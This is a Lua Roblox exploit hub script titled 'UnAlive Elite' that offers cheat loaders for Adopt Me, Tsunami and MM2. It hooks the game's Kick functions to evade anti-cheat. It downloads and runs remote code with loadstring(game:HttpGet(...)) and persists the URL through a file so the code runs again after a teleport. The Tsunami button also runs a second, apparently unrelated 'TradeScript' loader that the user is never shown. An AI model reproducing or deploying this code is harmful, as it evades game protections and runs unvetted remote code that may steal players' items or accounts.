--// SERVICES
local TeleportService = game:GetService("TeleportService")
local Players = game:GetService("Players")
local TweenService = game:GetService("TweenService")
local LP = Players.LocalPlayer

local FileName = "UnAlive_Choice_Ultimate.txt"
local DiscordInvite = "https://discord.gg/v8s9RQ8M8b"

--====================================================
-- ANTI-KICK (UNCHANGED)
--====================================================

local function ApplyBypass()
    local success, err = pcall(function()
        local old; old = hookmetamethod(game, "__namecall", function(self, ...)
            local method = getnamecallmethod()
            if self == LP and (method == "Kick" or method == "kick") then return nil end
            return old(self, ...)
        end)
        hookfunction(LP.Kick, function(self, ...) return nil end)
    end)
end

local function ExecuteWithDiscord(url)
    ApplyBypass()
    task.delay(3,function()
        if setclipboard then
            setclipboard(DiscordInvite)
        end
    end)
    loadstring(game:HttpGet(url))()
end

-- auto run after teleport
if isfile and isfile(FileName) then
    local savedUrl = readfile(FileName)
    delfile(FileName)
    ExecuteWithDiscord(savedUrl)
    return
end

--====================================================
-- THEME
--====================================================

local Accent = Color3.fromRGB(140,210,255)
local ButtonColor = Color3.fromRGB(55,60,70)
local Background = Color3.fromRGB(18,18,22)

--====================================================
-- GUI
--====================================================

local ScreenGui = Instance.new("ScreenGui",game.CoreGui)
ScreenGui.ResetOnSpawn = false

local Main = Instance.new("Frame",ScreenGui)
Main.Size = UDim2.new(0,420,0,200)
Main.Position = UDim2.new(.5,-210,.5,-100)
Main.BackgroundColor3 = Background
Main.BorderSizePixel = 0
Main.Active = true
Main.Draggable = true
Instance.new("UICorner",Main).CornerRadius = UDim.new(0,10)

-- open animation
Main.Size = UDim2.new(0,0,0,0)
TweenService:Create(Main,TweenInfo.new(.35,Enum.EasingStyle.Quart),{
    Size = UDim2.new(0,420,0,200)
}):Play()

--====================================================
-- HEADER
--====================================================

local Header = Instance.new("Frame",Main)
Header.Size = UDim2.new(1,0,0,36)
Header.BackgroundColor3 = Color3.fromRGB(25,25,30)
Instance.new("UICorner",Header).CornerRadius = UDim.new(0,10)

local Title = Instance.new("TextLabel",Header)
Title.Size = UDim2.new(1,-90,1,0)
Title.Position = UDim2.new(0,10,0,0)
Title.Text = "UnAlive Elite"
Title.BackgroundTransparency = 1
Title.TextColor3 = Color3.new(1,1,1)
Title.Font = Enum.Font.GothamBold
Title.TextSize = 14
Title.TextXAlignment = Enum.TextXAlignment.Left

--====================================================
-- CONTROL BOX
--====================================================

local ControlBox = Instance.new("Frame",Header)
ControlBox.Size = UDim2.new(0,70,0,26)
ControlBox.Position = UDim2.new(1,-75,0,5)
ControlBox.BackgroundColor3 = Color3.fromRGB(35,35,42)
Instance.new("UICorner",ControlBox).CornerRadius = UDim.new(0,6)

local Layout = Instance.new("UIListLayout",ControlBox)
Layout.FillDirection = Enum.FillDirection.Horizontal
Layout.HorizontalAlignment = Enum.HorizontalAlignment.Center
Layout.Padding = UDim.new(0,4)

local Min = Instance.new("TextButton",ControlBox)
Min.Size = UDim2.new(0,28,1,0)
Min.Text = "-"
Min.BackgroundTransparency = 1
Min.TextColor3 = Color3.new(1,1,1)
Min.Font = Enum.Font.GothamBold
Min.TextSize = 18

local Close = Instance.new("TextButton",ControlBox)
Close.Size = UDim2.new(0,28,1,0)
Close.Text = "X"
Close.BackgroundTransparency = 1
Close.TextColor3 = Color3.fromRGB(255,120,120)
Close.Font = Enum.Font.GothamBold
Close.TextSize = 16

--====================================================
-- CONTAINER
--====================================================

local Container = Instance.new("Frame",Main)
Container.Size = UDim2.new(1,0,1,-36)
Container.Position = UDim2.new(0,0,0,36)
Container.BackgroundTransparency = 1

-- sidebar

local Sidebar = Instance.new("Frame",Container)
Sidebar.Size = UDim2.new(0,120,1,0)
Sidebar.BackgroundColor3 = Color3.fromRGB(22,22,28)
Instance.new("UICorner",Sidebar).CornerRadius = UDim.new(0,10)

local GamesTab = Instance.new("TextLabel",Sidebar)
GamesTab.Size = UDim2.new(1,-16,0,36)
GamesTab.Position = UDim2.new(0,8,0,10)
GamesTab.Text = "Games"
GamesTab.BackgroundColor3 = Color3.fromRGB(35,35,42)
GamesTab.TextColor3 = Color3.new(1,1,1)
GamesTab.Font = Enum.Font.GothamBold
GamesTab.TextSize = 13
Instance.new("UICorner",GamesTab)

--====================================================
-- FIXED DIVIDER (NON-ROUNDED LOOK)
--====================================================

local Divider = Instance.new("Frame",Container)
Divider.Position = UDim2.new(0,120,0,0)
Divider.Size = UDim2.new(0,2,1,-10)
Divider.BackgroundColor3 = Color3.fromRGB(40,40,50)
Divider.BorderSizePixel = 0

-- page

local Page = Instance.new("Frame",Container)
Page.Position = UDim2.new(0,121,0,0)
Page.Size = UDim2.new(1,-121,1,0)
Page.BackgroundTransparency = 1

local Layout2 = Instance.new("UIListLayout",Page)
Layout2.Padding = UDim.new(0,12)

local Padding = Instance.new("UIPadding",Page)
Padding.PaddingTop = UDim.new(0,12)
Padding.PaddingLeft = UDim.new(0,12)
Padding.PaddingRight = UDim.new(0,12)

--====================================================
-- BUTTON FUNCTION
--====================================================

local function CreateButton(text,callback)

    local Button = Instance.new("TextButton",Page)
    Button.Size = UDim2.new(1,0,0,42)
    Button.BackgroundColor3 = ButtonColor
    Button.Text = text
    Button.TextColor3 = Color3.new(1,1,1)
    Button.Font = Enum.Font.GothamBold
    Button.TextSize = 14
    Instance.new("UICorner",Button)

    Button.MouseEnter:Connect(function()
        TweenService:Create(Button,TweenInfo.new(.15),{
            BackgroundColor3 = Accent
        }):Play()
    end)

    Button.MouseLeave:Connect(function()
        TweenService:Create(Button,TweenInfo.new(.15),{
            BackgroundColor3 = ButtonColor
        }):Play()
    end)

    Button.MouseButton1Click:Connect(function()
        callback(Button)
    end)

end

--====================================================
-- GAME BUTTONS
--====================================================

CreateButton("🐾 Adopt Me",function(btn)

    if game.PlaceId == 920587237 then
        ExecuteWithDiscord("https://raw.githubusercontent.com/UnAliveScripts/UnAlive-AdoptMe/refs/heads/main/loader.lua")
        task.wait(1)
        ScreenGui:Destroy()
    else
        btn.Text = "Teleporting..."
        if writefile then
            writefile(FileName,"https://raw.githubusercontent.com/UnAliveScripts/UnAlive-AdoptMe/refs/heads/main/loader.lua")
        end
        TeleportService:Teleport(920587237,LP)
    end

end)

CreateButton("🌊 Tsunami",function(btn)

    if game.PlaceId == 131623223084840 then

        ExecuteWithDiscord("https://raw.githubusercontent.com/UnAliveScripts/UnAlive-Tsunami/refs/heads/main/loader.lua")

        task.wait(1)

        -- second script dh
        loadstring(game:HttpGet("https://raw.githubusercontent.com/PikaEvil619/ETFBTradeScript/refs/heads/main/loader.lua"))()

        task.wait(2)
        ScreenGui:Destroy()

    else
        btn.Text = "Teleporting..."
        if writefile then
            writefile(FileName,"https://raw.githubusercontent.com/UnAliveScripts/UnAlive-Tsunami/refs/heads/main/loader.lua")
        end
        TeleportService:Teleport(131623223084840,LP)
    end

end)

CreateButton("🔪 MM2",function(btn)

    if game.PlaceId == 142823291 then -- MM2 place id
        ExecuteWithDiscord("https://raw.githubusercontent.com/UnAliveScripts/UnAlive-MM2/refs/heads/main/loader.lua")
        task.wait(1)
        ScreenGui:Destroy()
    else
        btn.Text = "Teleporting..."
        if writefile then
            writefile(FileName,"https://raw.githubusercontent.com/UnAliveScripts/UnAlive-MM2/refs/heads/main/loader.lua")
        end
        TeleportService:Teleport(142823291,LP)
    end

end)

--====================================================
-- WINDOW CONTROLS
--====================================================

local minimized = false

Min.MouseButton1Click:Connect(function()

    minimized = not minimized

    if minimized then
        Container.Visible = false

        TweenService:Create(Main,TweenInfo.new(.25,Enum.EasingStyle.Quart),{
            Size = UDim2.new(0,420,0,36)
        }):Play()
    else

        TweenService:Create(Main,TweenInfo.new(.25,Enum.EasingStyle.Quart),{
            Size = UDim2.new(0,420,0,200)
        }):Play()

        task.wait(.25)
        Container.Visible = true

    end

end)

Close.MouseButton1Click:Connect(function()

    Container.Visible = false

    TweenService:Create(Main,TweenInfo.new(.25,Enum.EasingStyle.Quart),{
        Size = UDim2.new(0,420,0,0)
    }):Play()

    task.wait(.25)
    ScreenGui:Destroy()

end)
